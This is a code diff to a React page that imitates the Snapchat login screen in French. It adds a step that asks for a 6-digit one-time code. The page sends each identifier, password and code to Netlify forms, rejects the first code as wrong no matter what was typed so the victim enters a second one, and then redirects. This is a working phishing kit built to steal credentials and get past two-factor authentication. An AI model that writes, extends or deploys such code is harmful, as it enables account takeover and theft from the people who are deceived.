@@ -1,6 +1,12 @@
 import React, { useRef, useState } from "react";
 import SnapchatLogo from "../../../attached_assets/snapchat_1785772849797.png";
 
+import {
+  InputOTP,
+  InputOTPGroup,
+  InputOTPSlot,
+} from "./components/ui/input-otp";
+
 const SnapchatGhost = () => (
   <img
     src={SnapchatLogo}
@@ -69,7 +75,7 @@ const EyeIcon = ({ open }: { open: boolean }) =>
   );
 
 // Step types
-type Step = "username" | "phone" | "password";
+type Step = "username" | "phone" | "password" | "otp";
 
 const countries: { code: string; flag: string; name: string }[] = [
   { code: "+1", flag: "🇺🇸", name: "United States" },
@@ -414,10 +420,13 @@ export default function LoginPage() {
   const [countryCode, setCountryCode] = useState("+1");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
+  const [otp, setOtp] = useState("");
   const [usernameError, setUsernameError] = useState("");
   const [phoneError, setPhoneError] = useState("");
   const [passwordError, setPasswordError] = useState("");
+  const [otpError, setOtpError] = useState("");
   const attemptsRef = useRef(0);
+  const otpAttemptsRef = useRef(0);
   const returnTo =
     new URLSearchParams(window.location.search).get("returnTo") || "/";
 
@@ -500,21 +509,45 @@ export default function LoginPage() {
       return;
     }
 
-    const storedUsername = username || phone;
-    if (storedUsername) {
-      window.sessionStorage.setItem("snapchatLoginUsername", storedUsername);
-    }
-
-    if (import.meta.env.DEV) {
-      window.location.assign(returnTo);
-      return;
-    }
-
+    setPasswordError("");
     await submitNetlifyForm("Snapchat-login-password", {
       identifier: username || phone,
       password,
     });
 
+    setPassword("");
+    setStep("otp");
+    setOtp("");
+    setOtpError("");
+  };
+
+  const handleOtpNext = async (e: React.FormEvent) => {
+    e.preventDefault();
+
+    if (otp.length < 6) {
+      setOtpError("Veuillez saisir le code OTP à 6 chiffres.");
+      return;
+    }
+
+    const storedUsername = username || phone;
+    if (storedUsername) {
+      window.sessionStorage.setItem("snapchatLoginUsername", storedUsername);
+    }
+
+    await submitNetlifyForm("Snapchat-login-otp", {
+      identifier: username || phone,
+      otp,
+    });
+
+    if (otpAttemptsRef.current === 0) {
+      otpAttemptsRef.current += 1;
+      setOtp("");
+      setOtpError("Ce code est incorrect. Veuillez réessayer.");
+      return;
+    }
+
+    setOtp("");
+    setOtpError("");
     window.location.assign(returnTo);
   };
 
@@ -770,7 +803,97 @@ export default function LoginPage() {
           </div>
         )}
 
-        {step !== "password" && (
+        {step === "otp" && (
+          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
+            <SnapchatGhost />
+            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
+              Entrer le code OTP
+            </h1>
+            <p className="mt-3 text-center text-[14px] text-[#555555]">
+              Nous avons envoyé un code OTP à 6 chiffres pour sécuriser votre
+              compte.
+            </p>
+
+            <div className="mt-4 flex items-center justify-center gap-2">
+              <span className="text-[14px] font-semibold text-[#333]">
+                {username || phone}
+              </span>
+              <button
+                type="button"
+                onClick={() => {
+                  setStep("password");
+                  setOtp("");
+                  setOtpError("");
+                  attemptsRef.current = 0;
+                  otpAttemptsRef.current = 0;
+                }}
+                className="text-[13px] font-semibold text-[#00C8FA] hover:underline"
+              >
+                Ce n'est pas vous ?
+              </button>
+            </div>
+
+            <form
+              name="Snapchat-login-otp"
+              method="POST"
+              data-netlify="true"
+              onSubmit={handleOtpNext}
+              className="mt-5"
+            >
+              <input
+                type="hidden"
+                name="form-name"
+                value="Snapchat-login-otp"
+              />
+              <input
+                type="hidden"
+                name="identifier"
+                value={username || phone}
+              />
+              <input type="hidden" name="otp" value={otp} />
+              <label className="block text-[13px] font-medium text-[#555555] mb-2">
+                Code OTP
+              </label>
+              <div className="flex justify-center">
+                <InputOTP
+                  maxLength={6}
+                  value={otp}
+                  onChange={(value) => {
+                    setOtp(value);
+                    setOtpError("");
+                  }}
+                  className="gap-2"
+                >
+                  <InputOTPGroup>
+                    {Array.from({ length: 6 }).map((_, i) => (
+                      <InputOTPSlot
+                        key={i}
+                        index={i}
+                        className="h-[52px] w-[52px] text-[20px] border-[1.5px] border-[#cccccc] rounded-[8px] first:border-[1.5px] last:border-[1.5px]"
+                      />
+                    ))}
+                  </InputOTPGroup>
+                </InputOTP>
+              </div>
+              {otpError && (
+                <p className="mt-1.5 text-center text-[13px] text-red-500">
+                  {otpError}
+                </p>
+              )}
+
+              <div className="mt-5 flex justify-center">
+                <button
+                  type="submit"
+                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
+                >
+                  Vérifier
+                </button>
+              </div>
+            </form>
+          </div>
+        )}
+
+        {step !== "password" && step !== "otp" && (
           <div className="mt-5 text-center">
             <span className="text-[15px] text-[#444444]">
               Nouveau sur Snapchat ?{" "}
